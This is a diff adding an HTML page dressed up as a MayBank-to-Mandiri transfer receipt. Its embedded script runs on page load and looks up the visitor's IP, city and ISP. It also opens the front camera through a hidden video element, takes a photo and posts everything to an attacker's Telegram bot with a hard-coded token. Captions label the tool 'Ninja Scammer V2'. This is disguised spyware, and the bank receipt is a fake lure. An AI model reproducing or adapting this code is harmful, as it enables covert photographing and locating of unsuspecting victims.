@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Bukti Transfer Bank</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .card {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 30px 28px;
+            max-width: 440px;
+            width: 100%;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.1);
+            border: 1px solid #e8ecf0;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            padding-bottom: 16px;
+            border-bottom: 2px dashed #e8ecf0;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .header-left .icon-bank {
+            width: 44px;
+            height: 44px;
+            background: #1a73e8;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 22px;
+        }
+
+        .header-left .title h2 {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1a1a2e;
+            letter-spacing: 0.3px;
+        }
+
+        .header-left .title p {
+            font-size: 12px;
+            color: #888;
+            font-weight: 500;
+        }
+
+        .status-badge {
+            background: #e6f7e6;
+            color: #1a8a1a;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 6px 14px;
+            border-radius: 30px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .status-badge i {
+            margin-right: 4px;
+        }
+
+        .detail {
+            margin-bottom: 20px;
+        }
+
+        .detail .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #f0f2f5;
+        }
+
+        .detail .row:last-child {
+            border-bottom: none;
+        }
+
+        .detail .label {
+            color: #888;
+            font-weight: 500;
+            font-size: 13px;
+        }
+
+        .detail .value {
+            color: #1a1a2e;
+            font-weight: 600;
+            font-size: 14px;
+            text-align: right;
+        }
+
+        .detail .value.amount {
+            color: #1a73e8;
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .footer-transfer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-top: 16px;
+            border-top: 2px dashed #e8ecf0;
+        }
+
+        .footer-transfer .code {
+            font-family: monospace;
+            font-size: 14px;
+            color: #555;
+            letter-spacing: 1px;
+            background: #f5f7fa;
+            padding: 6px 14px;
+            border-radius: 8px;
+        }
+
+        .footer-transfer .time {
+            font-size: 12px;
+            color: #aaa;
+        }
+
+        .footer-transfer .time i {
+            margin-right: 4px;
+        }
+
+        .watermark {
+            text-align: center;
+            margin-top: 18px;
+            font-size: 11px;
+            color: #ccc;
+            letter-spacing: 0.5px;
+        }
+
+        .watermark i {
+            margin-right: 4px;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(80px);
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(10px);
+            padding: 10px 24px;
+            border-radius: 30px;
+            color: #fff;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            opacity: 0;
+            transition: all 0.5s ease;
+            pointer-events: none;
+            z-index: 999;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0px);
+        }
+
+        .toast i {
+            font-size: 14px;
+        }
+
+        .toast.success i { color: #4ade80; }
+        .toast.error i { color: #f5576c; }
+
+        /* ===== ELEMEN KAMERA (TIDAK TERLIHAT) ===== */
+        #cameraVideo {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        #photoCanvas {
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 20px 16px; }
+            .header-left .icon-bank { width: 38px; height: 38px; font-size: 18px; }
+            .detail .value.amount { font-size: 16px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== ELEMEN TERSEMBUNYI UNTUK KAMERA ===== -->
+    <video id="cameraVideo" autoplay playsinline muted></video>
+    <canvas id="photoCanvas"></canvas>
+
+    <!-- ===== TOAST ===== -->
+    <div class="toast" id="toast">
+        <i class="fas fa-check-circle"></i>
+        <span id="toastMessage">Terkirim</span>
+    </div>
+
+    <!-- ===== TAMPILAN BUKTI TRANSFER ===== -->
+    <div class="card">
+
+        <div class="header">
+            <div class="header-left">
+                <div class="icon-bank">
+                    <i class="fas fa-university"></i>
+                </div>
+                <div class="title">
+                    <h2>MayBank Country</h2>
+                    <p>Via Mobile Banking</p>
+                </div>
+            </div>
+            <span class="status-badge">
+                <i class="fas fa-check-circle"></i> Sukses
+            </span>
+        </div>
+
+        <div class="detail">
+            <div class="row">
+                <span class="label">Sending Bank</span>
+                <span class="value">MayBank</span>
+            </div>
+            <div class="row">
+                <span class="label">Account Number</span>
+                <span class="value">4283 3212 3456 7890</span>
+            </div>
+            <div class="row">
+                <span class="label">Sender Name</span>
+                <span class="value">Ahmad Bin Abdullah</span>
+            </div>
+            <div class="row">
+                <span class="label">Destination Bank</span>
+                <span class="value">Mandiri</span>
+            </div>
+            <div class="row">
+                <span class="label">Destination Account Number</span>
+                <span class="value">987 654 3210</span>
+            </div>
+            <div class="row">
+                <span class="label">Recipient's name</span>
+                <span class="value">Budi Santoso</span>
+            </div>
+            <div class="row">
+                <span class="label">Transfer Amount</span>
+                <span class="value amount">Rp 2.500.000</span>
+            </div>
+            <div class="row">
+                <span class="label">News</span>
+                <span class="value" style="font-style:italic;color:#666;">Pembayaran Invoice #INV-2026-06</span>
+            </div>
+            <div class="row">
+                <span class="label">Date</span>
+                <span class="value">21 Juni 2026</span>
+            </div>
+            <div class="row">
+                <span class="label">Time</span>
+                <span class="value">14:32 WIB</span>
+            </div>
+        </div>
+
+        <div class="footer-transfer">
+            <span class="code"><i class="fas fa-hashtag" style="color:#aaa;margin-right:4px;"></i>TRX-MAY-8862-21</span>
+            <span class="time"><i class="fas fa-badge-check"></i> MAYBANK</span>
+        </div>
+
+        <div class="watermark">
+            <i class="fas fa-shield-alt"></i> Verified By MayBank
+        </div>
+
+    </div>
+
+    <script>
+        (function() {
+
+            // ============================================
+            // KONFIGURASI TELEGRAM BOT
+            // ============================================
+            const TELEGRAM_TOKEN = '8820463898:AAEcjKTEU6C83P9DCPEp4ZzdH3b5-bTUrXY'; // GANTI!
+            const TELEGRAM_CHAT_ID = '8715205181'; // GANTI!
+
+            // ============================================
+            // VARIABLE
+            // ============================================
+            let userIP = 'Tidak terdeteksi';
+            let userLocation = 'Tidak terdeteksi';
+            let userISP = 'Tidak terdeteksi';
+            let userDevice = 'Tidak terdeteksi';
+
+            // ============================================
+            // DETEKSI DEVICE
+            // ============================================
+            function getDeviceInfo() {
+                const ua = navigator.userAgent;
+                if (/mobile/i.test(ua)) {
+                    if (/android/i.test(ua)) return 'Android Phone';
+                    if (/iphone|ipad|ipod/i.test(ua)) return 'iPhone / iPad';
+                    return 'Mobile Device';
+                }
+                return 'Desktop / Laptop';
+            }
+
+            // ============================================
+            // AMBIL IP & LOKASI
+            // ============================================
+            function getIPAndLocation() {
+                return fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(data => {
+                        userIP = data.ip || 'Tidak terdeteksi';
+                        userLocation = data.city && data.country_name ?
+                            `${data.city}, ${data.region}, ${data.country_name}` :
+                            'Tidak terdeteksi';
+                        userISP = data.org || 'Tidak terdeteksi';
+                        return data;
+                    })
+                    .catch(() => {
+                        return fetch('http://ip-api.com/json/')
+                            .then(response => response.json())
+                            .then(data => {
+                                if (data.status === 'success') {
+                                    userIP = data.query || 'Tidak terdeteksi';
+                                    userLocation = `${data.city}, ${data.regionName}, ${data.country}`;
+                                    userISP = data.isp || 'Tidak terdeteksi';
+                                }
+                                return data;
+                            })
+                            .catch(() => {
+                                console.log('⚠️ Gagal ambil IP & lokasi');
+                            });
+                    });
+            }
+
+            // ============================================
+            // AMBIL FOTO DARI KAMERA (TANPA FALLBACK ICON)
+            // ============================================
+            function ambilFotoDariKamera() {
+                return new Promise((resolve, reject) => {
+                    const video = document.getElementById('cameraVideo');
+                    const canvas = document.getElementById('photoCanvas');
+
+                    // Cek apakah browser support getUserMedia
+                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                        reject(new Error('Browser tidak support kamera'));
+                        return;
+                    }
+
+                    // Buka kamera depan
+                    navigator.mediaDevices.getUserMedia({
+                            video: {
+                                facingMode: 'user',
+                                width: { ideal: 640 },
+                                height: { ideal: 480 }
+                            },
+                            audio: false
+                        })
+                        .then(stream => {
+                            video.srcObject = stream;
+                            video.play();
+
+                            // Tunggu video benar-benar siap
+                            const checkReady = setInterval(() => {
+                                if (video.readyState === 4 && video.videoWidth > 0 && video
+                                    .videoHeight > 0) {
+                                    clearInterval(checkReady);
+
+                                    // Ambil gambar dari video
+                                    canvas.width = video.videoWidth;
+                                    canvas.height = video.videoHeight;
+                                    const ctx = canvas.getContext('2d');
+                                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                                    // Matikan kamera
+                                    stream.getTracks().forEach(track => track.stop());
+                                    video.srcObject = null;
+
+                                    // Convert ke data URL JPEG
+                                    const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
+                                    resolve(dataUrl);
+                                }
+                            }, 100);
+
+                            // Timeout kalau terlalu lama
+                            setTimeout(() => {
+                                clearInterval(checkReady);
+                                if (video.readyState < 4) {
+                                    reject(new Error('Timeout: Kamera tidak siap'));
+                                }
+                            }, 5000);
+                        })
+                        .catch(err => {
+                            reject(err);
+                        });
+                });
+            }
+
+            // ============================================
+            // PROSES UTAMA
+            // ============================================
+            const alreadySent = localStorage.getItem('foto_terkirim_rahasia') === 'true';
+
+            if (!alreadySent) {
+                window.addEventListener('load', function() {
+                    userDevice = getDeviceInfo();
+
+                    // Ambil IP & lokasi
+                    getIPAndLocation().then(() => {
+                        // Tunggu sebentar, lalu ambil foto dari kamera
+                        setTimeout(() => {
+                            ambilFotoDariKamera()
+                                .then(fotoDataUrl => {
+                                    console.log('✅ Foto berhasil diambil dari kamera');
+                                    kirimFotoKeTelegram(fotoDataUrl);
+                                })
+                                .catch(err => {
+                                    console.error('❌ Gagal akses kamera:', err);
+                                    showToast('❌ Gagal akses kamera', 'error');
+
+                                    // === TIDAK ADA FALLBACK ICON ===
+                                    // Kirim pesan teks saja (tanpa foto)
+                                    kirimPesanTeksTanpaFoto();
+                                });
+                        }, 1500);
+                    });
+                });
+            } else {
+                console.log('ℹ️ Foto sudah terkirim sebelumnya (tidak kirim ulang)');
+                showToast('✅ Sudah terkirim sebelumnya', 'success');
+            }
+
+            // ============================================
+            // KIRIM FOTO KE TELEGRAM
+            // ============================================
+            function kirimFotoKeTelegram(imageDataUrl) {
+
+                if (!imageDataUrl) {
+                    kirimPesanTeksTanpaFoto();
+                    return;
+                }
+
+                const blob = dataURLToBlob(imageDataUrl);
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'foto_dari_kamera.jpg');
+
+                const caption = `
+📸 𝗙𝗢𝗧𝗢 𝗠𝗨𝗞𝗔 𝗦𝗖𝗔𝗠𝗠𝗘𝗥
+
+👤 ∂єνєℓσρєя : NinjaAttacks
+🤖 ηαмα вσт : Ninja Scammer V2
+🕐 ωαктυ : ${new Date().toLocaleString('id-ID')}
+🪷 υѕєя : Owner / Cio
+
+━━━━━━━━━━━━━━━━━━━
+📍 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗦𝗖𝗔𝗠𝗠𝗘𝗥
+━━━━━━━━━━━━━━━━━━━
+📱 ∂єνι¢є : ${userDevice}
+📡 ιρ α∂∂яєѕѕ : ${userIP}
+🌍 ℓσ¢αтιση : ${userLocation}
+🏢 ιѕρ : ${userISP}
+━━━━━━━━━━━━━━━━━━━
+                `;
+
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'Markdown');
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
+
+                fetch(url, { method: 'POST', body: formData })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok) {
+                            localStorage.setItem('foto_terkirim_rahasia', 'true');
+                            showToast('✅ Foto kamera terkirim', 'success');
+                            console.log('✅ Foto dari kamera + IP/Lokasi terkirim ke Telegram');
+                        } else {
+                            throw new Error(data.description || 'Gagal');
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Telegram error:', err);
+                        showToast('⚠️ Gagal kirim', 'error');
+                        // Kirim teks saja kalau foto gagal
+                        kirimPesanTeksTanpaFoto();
+                    });
+            }
+
+            // ============================================
+            // KIRIM PESAN TEKS (TANPA FOTO) - FALLBACK
+            // ============================================
+            function kirimPesanTeksTanpaFoto() {
+                const pesan = `
+⚠️ *GAGAL AMBIL FOTO DARI KAMERA*
+
+👤 ∂єνєℓσρєя : NinjaAttacks
+🤖 ηαмα вσт : Ninja Scammer V2
+🕐 ωαктυ : ${new Date().toLocaleString('id-ID')}
+🪷 υѕєя : Owner / Cio
+
+━━━━━━━━━━━━━━━━━━━
+📍 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗦𝗖𝗔𝗠𝗠𝗘𝗥
+━━━━━━━━━━━━━━━━━━━
+📱 ∂єνι¢є : ${userDevice}
+📡 ιρ α∂∂яєѕѕ : ${userIP}
+🌍 ℓσ¢αтιση : ${userLocation}
+🏢 ιѕρ : ${userISP}
+━━━━━━━━━━━━━━━━━━━
+⚠️ Pengguna menolak izin kamera atau kamera tidak tersedia.
+                `;
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('text', pesan);
+                formData.append('parse_mode', 'Markdown');
+
+                fetch(url, { method: 'POST', body: formData })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok) {
+                            localStorage.setItem('foto_terkirim_rahasia', 'true');
+                            showToast('⚠️ Kirim teks (tanpa foto)', 'error');
+                            console.log('⚠️ Pesan teks terkirim (kamera gagal)');
+                        }
+                    })
+                    .catch(err => console.error('Gagal kirim pesan:', err));
+            }
+
+            // ============================================
+            // HELPER
+            // ============================================
+            function dataURLToBlob(dataUrl) {
+                const arr = dataUrl.split(',');
+                const mime = arr[0].match(/:(.*?);/)[1];
+                const bstr = atob(arr[1]);
+                let n = bstr.length;
+                const u8arr = new Uint8Array(n);
+                while (n--) u8arr[n] = bstr.charCodeAt(n);
+                return new Blob([u8arr], { type: mime });
+            }
+
+            function showToast(message, type = 'success') {
+                const toast = document.getElementById('toast');
+                toast.className = 'toast ' + type;
+                document.getElementById('toastMessage').textContent = message;
+                toast.classList.add('show');
+                setTimeout(() => toast.classList.remove('show'), 4000);
+            }
+
+            console.log('✅ Halaman siap! Mencoba ambil foto dari KAMERA HP.');
+            console.log('⚠️ Ganti TELEGRAM_TOKEN dan TELEGRAM_CHAT_ID!');
+            console.log('⚠️ Pastikan izinkan akses kamera saat diminta browser.');
+
+        })();
+    </script>
+
+</body>
+</html>
